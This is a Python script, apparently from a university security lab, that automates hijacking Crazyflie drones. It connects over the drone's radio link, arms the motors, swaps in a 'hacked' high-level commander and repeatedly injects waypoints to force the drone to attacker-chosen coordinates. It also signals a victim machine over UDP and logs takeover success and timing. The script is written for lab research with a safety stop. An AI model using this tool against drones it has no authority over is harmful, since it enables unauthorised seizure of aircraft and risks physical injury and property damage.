"""
===============================================================
SWARM UAV TAKEOVER & HIJACK METRICS CONTROLLER
===============================================================

Author: Fatemeh Azam faa5778@utulsa.edu
Purpose:
    This script simulates an attacker-controlled takeover of one or
    more Crazyflie UAVs for cybersecurity research and education.

    It demonstrates:
    - Unauthorized drone takeover
    - Flight controller hijacking
    - Malicious waypoint injection
    - Victim–attacker coordination via UDP
    - Swarm-level control
    - Emergency safety shutdown
    - Quantitative attack performance metrics

⚠️ WARNING:
    This code is intended ONLY for controlled lab environments
    using hardware you own or are authorized to test.

Dependencies:
    - cflib (Crazyflie Python library)
    - Crazyradio PA
    - Python 3.x
===============================================================
"""

import time
import logging
import signal
import sys
import socket
import json
from datetime import datetime

from cflib.crazyflie import Crazyflie
from cflib import crtp
from cflib.crazyflie.swarm import Swarm, CachedCfFactory
from cflib.crazyflie.log import LogConfig

# -------------------------------------------------------------
# Logging configuration
# -------------------------------------------------------------
logging.basicConfig(level=logging.INFO)

# =============================================================
# METRICS TRACKING
# =============================================================
class AttackMetrics:
    """
    Tracks and calculates attack performance metrics for
    drone takeover and hijacking attempts.
    """

    def __init__(self):
        # Stores attack start timestamps per drone URI
        self.start_times = {}

        # Stores successful takeover durations per drone
        self.takeover_times = {}

        # Lists of drone URIs by outcome
        self.successful_takeovers = []
        self.failed_takeovers = []

    def start_attack(self, uri):
        """
        Record the start time of a takeover attempt.

        Args:
            uri (str): Drone radio URI
        """
        self.start_times[uri] = time.time()
        print(f"[METRICS] Attack started for {uri} at {self.start_times[uri]:.2f}")

    def record_takeover(self, uri, success=True, takeover_time=None):
        """
        Record the result of a takeover attempt.

        Args:
            uri (str): Drone radio URI
            success (bool): Whether takeover succeeded
            takeover_time (float): Time to takeover (seconds)
        """
        if uri not in self.start_times:
            print(f"[METRICS] Warning: No start time recorded for {uri}")
            return

        # Calculate takeover duration if not provided
        if takeover_time is None:
            takeover_time = time.time() - self.start_times[uri]

        if success:
            self.takeover_times[uri] = takeover_time
            self.successful_takeovers.append(uri)
            print(f"[METRICS] ✅ Takeover successful for {uri} in {takeover_time:.2f}s")
        else:
            self.failed_takeovers.append(uri)
            print(f"[METRICS] ❌ Takeover failed for {uri}")

    def calculate_metrics(self):
        """
        Calculate and print a summary of all collected metrics.

        Returns:
            dict: Metrics suitable for JSON export
        """
        print("\n" + "=" * 60)
        print("ATTACK METRICS SUMMARY")
        print("=" * 60)

        total_attempts = len(self.successful_takeovers) + len(self.failed_takeovers)

        # Success rate
        if total_attempts > 0:
            success_rate = (len(self.successful_takeovers) / total_attempts) * 100
            print(f"Takeover Success Rate: {success_rate:.1f}% "
                  f"({len(self.successful_takeovers)}/{total_attempts})")
        else:
            success_rate = 0
            print("Takeover Success Rate: No attempts recorded")

        # Timing statistics
        if self.takeover_times:
            avg_time = sum(self.takeover_times.values()) / len(self.takeover_times)
            min_time = min(self.takeover_times.values())
            max_time = max(self.takeover_times.values())

            print(f"Average Time to Takeover: {avg_time:.2f}s")
            print(f"Min/Max Time: {min_time:.2f}s / {max_time:.2f}s")

            print("\nIndividual Drone Times:")
            for uri, t in self.takeover_times.items():
                print(f"  {uri}: {t:.2f}s")
        else:
            avg_time = 0
            print("Average Time to Takeover: No successful takeovers")

        print("=" * 60)

        return {
            "success_rate": success_rate,
            "avg_takeover_time": avg_time,
            "successful_count": len(self.successful_takeovers),
            "total_attempts": total_attempts
        }


# Initialize global metrics tracker
metrics = AttackMetrics()

# =============================================================
# GLOBAL STATE & CONFIGURATION
# =============================================================

# Tracks currently connected drones for cleanup & emergency stop
active_drones = {}

# Victim system network configuration (UDP signaling)
#This helps if a controlled attack with less racing conditions
#is desired. By signaling the victim we can force a disconnection 
#on the victim side
VICTIM_IP = "172.16.151.168"
VICTIM_PORT = 9999

# Target drone URIs
SWARM_URIS = [
    "radio://1/80/2M/E7E7E7E7E9"
]

# Position logging state
position_files = {}
position_loggers = {}

# Identifier for attacker-controlled logs
controller = "ATTACKER-CTRL"

# Stores latest known drone positions
current_positions = {}

# =============================================================
# POSITION LOGGING
# =============================================================
def setup_position_logging(cf, uri):
    """
    Enable periodic position logging for a drone and append
    results to a JSONL file.

    Args:
        cf (Crazyflie): Connected Crazyflie object
        uri (str): Drone URI

    Returns:
        LogConfig or None
    """

    def log_pos_callback(timestamp, data, logconf):
        """
        Callback triggered whenever position data is received.
        """
        try:
            x = data["stateEstimate.x"]
            y = data["stateEstimate.y"]
            z = data["stateEstimate.z"]

            # Update in-memory position tracking
            current_positions[uri] = (x, y, z)

            # Format position record
            position_data = {
                "timestamp": time.time(),
                "datetime": datetime.now().isoformat(),
                "x": float(x),
                "y": float(y),
                "z": float(z),
                "controller": controller
            }

            # Append to drone-specific log file
            if uri in position_files:
                with open(position_files[uri], "a") as f:
                    f.write(json.dumps(position_data) + "\n")

        except Exception as e:
            print(f"Position logging error for {uri}: {e}")

    # Configure log variables and frequency
    log_conf = LogConfig(name="Position", period_in_ms=500)
    log_conf.add_variable("stateEstimate.x", "float")
    log_conf.add_variable("stateEstimate.y", "float")
    log_conf.add_variable("stateEstimate.z", "float")

    try:
        cf.log.add_config(log_conf)
        log_conf.data_received_cb.add_callback(log_pos_callback)
        log_conf.start()

        position_loggers[uri] = log_conf
        filename = f"drone_position_{uri.replace('://', '_').replace('/', '_')}.jsonl"
        position_files[uri] = filename

        print(f"Attacker position logging started for {uri}")
        return log_conf

    except Exception as e:
        print(f"❌ Failed to start position logging for {uri}: {e}")
        return None


def stop_position_logging(uri):
    """
    Stop and remove position logging for a drone.
    """
    if uri in position_loggers:
        try:
            position_loggers[uri].stop()
            del position_loggers[uri]
            print(f"Position logging stopped for {uri}")
        except Exception as e:
            print(f"Error stopping position logger for {uri}: {e}")


# =============================================================
# USER INPUT & VICTIM SIGNALING
# =============================================================
def get_user_coordinates():
    """
    Prompt user for malicious target coordinates.

    Returns:
        tuple(float, float): X, Y coordinates
    """
    print("\nSpecify false coordinates for UAV redirection:")
    try:
        x = float(input("Enter X coordinate (meters): "))
        y = float(input("Enter Y coordinate (meters): "))
        return x, y
    except ValueError:
        print("Invalid input. Using default (0, 0)")
        return 0.0, 0.0


def send_victim_signal(message):
    """
    Send a UDP control signal to the victim system.

    Args:
        message (str): Message to send

    Returns:
        bool: Success status
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(message.encode(), (VICTIM_IP, VICTIM_PORT))
        sock.close()
        print(f"Sent signal to victim: {message}")
        return True
    except Exception as e:
        print(f"Failed to send signal to victim: {e}")
        return False


# =============================================================
# EMERGENCY STOP HANDLER
# =============================================================
def emergency_stop(sig=None, frame=None):
    """
    Immediately stop all drones, cut motors, close connections,
    notify victim, and exit program.
    """
    print("🛑 EMERGENCY STOP TRIGGERED")

    for uri, cf in active_drones.items():
        try:
            stop_position_logging(uri)
            cf.commander.send_stop_setpoint()
            cf.close_link()
            print(f"Stopped and disconnected {uri}")
        except Exception as e:
            print(f"Emergency stop error for {uri}: {e}")

    send_victim_signal("EMERGENCY_STOP")
    sys.exit(0)


# Register Ctrl+C handler
signal.signal(signal.SIGINT, emergency_stop)

# =============================================================
# DRONE TAKEOVER
# =============================================================
def takeover_single_drone(uri):
    """
    Attempt to hijack control of a single drone.

    Args:
        uri (str): Drone URI

    Returns:
        (HackedHighLevelCommander, Crazyflie) or (None, None)
    """
    print(f"⚡ ATTACKER: Connecting to {uri}")
    metrics.start_attack(uri)

    cf_attack = Crazyflie(rw_cache="./cache")
    active_drones[uri] = cf_attack
    takeover_start = time.time()

    try:
        cf_attack.open_link(uri)
        time.sleep(2)

        # Arm motors
        cf_attack.platform.send_arming_request(True)
        time.sleep(1)

        # Inject hacked high-level commander
        from cflib.crazyflie.high_level_commander import HackedHighLevelCommander
        commander = HackedHighLevelCommander(cf_attack)

        takeover_time = time.time() - takeover_start
        metrics.record_takeover(uri, success=True, takeover_time=takeover_time)

        return commander, cf_attack

    except Exception as e:
        print(f"❌ Takeover failed for {uri}: {e}")
        metrics.record_takeover(uri, success=False)
        return None, None


# =============================================================
# HIJACK & MOVEMENT CONTROL
# =============================================================
def ensure_drone_reaches_target(mc, uri, target_x, target_y,
                               max_attempts=7, move_time=6, tolerance=0.3):
    """
    Repeatedly inject waypoint commands to force the drone
    toward a malicious target.

    Args:
        mc: High-level commander
        uri (str): Drone URI
        target_x (float): Target X
        target_y (float): Target Y

    Returns:
        bool: Whether hijack completed successfully
    """
    attempt = 1
    hijack_start_time = time.time()

    while attempt <= max_attempts:
        print(f"Attempt {attempt}/{max_attempts}")
        mc.go_to(target_x, target_y, 1, 0, move_time)
        time.sleep(move_time + 1)

        # Escalate attack after first attempt
        if attempt >= 2:
            move_time = 3
            send_victim_signal("ATTACK")

        # User decision loop
        print("Press ENTER to retry, any other key to land:")
        choice = input()
        if choice != "":
            mc.land(0, 4)
            time.sleep(4)
            return False

        attempt += 1

    hijack_duration = time.time() - hijack_start_time
    print(f"Hijack completed in {hijack_duration:.2f}s")
    return False


# =============================================================
# SWARM CONTROL
# =============================================================
def swarm_takeover_control():
    """
    Coordinate takeover and hijack of all drones in the swarm.
    """
    commanders = []
    cfs = []

    target_x, target_y = get_user_coordinates()

    for uri in SWARM_URIS:
        mc, cf = takeover_single_drone(uri)
        if mc and cf:
            commanders.append(mc)
            cfs.append(cf)

    if not commanders:
        metrics.calculate_metrics()
        return

    try:
        for i, mc in enumerate(commanders):
            ensure_drone_reaches_target(mc, SWARM_URIS[i], target_x, target_y)

        # Land all drones
        for mc in commanders:
            mc.land(0, 4)
            time.sleep(4)

        # Stop motors & close links
        for cf in cfs:
            cf.commander.send_stop_setpoint()
            cf.close_link()

        send_victim_signal("ATTACKER_READY")

    except Exception as e:
        print(f"Swarm error: {e}")
        send_victim_signal("SWARM_ATTACK_FAILED")

    # Final metrics export
    final_metrics = metrics.calculate_metrics()
    with open(f"attack_metrics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
        json.dump(final_metrics, f, indent=2)


# =============================================================
# ENTRY POINT
# =============================================================
if __name__ == "__main__":
    print("SWARM ATTACKER COMPUTER")
    print("Press Ctrl+C for emergency stop")

    crtp.init_drivers()
    swarm_takeover_control()
